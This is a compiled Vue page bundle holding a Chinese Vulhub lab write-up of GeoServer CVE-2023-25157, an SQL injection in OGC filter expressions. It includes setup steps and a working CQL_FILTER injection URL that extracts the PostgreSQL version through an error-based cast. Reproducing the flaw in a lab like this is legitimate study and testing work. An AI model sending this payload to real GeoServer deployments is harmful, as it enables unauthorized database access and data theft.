import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as n,c as s,a as e,b as a,d as r,e as d}from"./app-58e4a7d6.js";const c={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。",-1),u=e("p",null,"在版本2.22.1和2.21.4及以前，多个OGC表达式中均存在SQL注入漏洞。",-1),h=e("p",null,"参考链接：",-1),m={href:"https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158",target:"_blank",rel:"noopener noreferrer"},_={href:"https://github.com/advisories/GHSA-7g5f-wrx8-5ccf",target:"_blank",rel:"noopener noreferrer"},g=d(`<h2 id="漏洞环境" tabindex="-1"><a class="header-anchor" href="#漏洞环境" aria-hidden="true">#</a> 漏洞环境</h2><p>Vulhub执行如下命令启动一个SeoServer 2.22.1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080/geoserver</code>即可查看到GeoServer的首页。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230619102046107.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>在利用漏洞前，需要目标服务器中存在类型是PostGIS的数据空间（datastore）和工作空间（workspace）。在Vulhub中，已经包含满足条件的工作空间，其信息如下：</p><ul><li>Workspace name: <code>vulhub</code></li><li>Data store name: <code>pg</code></li><li>Feature type (table) name: <code>example</code></li><li>One of attribute from feature type: <code>name</code></li></ul><p>利用这些已知参数，发送如下URL即可触发SQL注入漏洞（URL Encode）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/geoserver/ows?service=wfs&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=vulhub:example&amp;CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230619102139101.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，已经使用SQL注入获取到了目标服务器PostgreSQL的版本。</p>`,12);function b(f,v){const t=i("ExternalLinkIcon");return n(),s("div",null,[l,p,u,h,e("ul",null,[e("li",null,[e("a",m,[a("https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158"),r(t)])]),e("li",null,[e("a",_,[a("https://github.com/advisories/GHSA-7g5f-wrx8-5ccf"),r(t)])])]),g])}const E=o(c,[["render",b],["__file","GeoServer OGC Filter SQL注入漏洞 CVE-2023-25157.html.vue"]]);export{E as default};
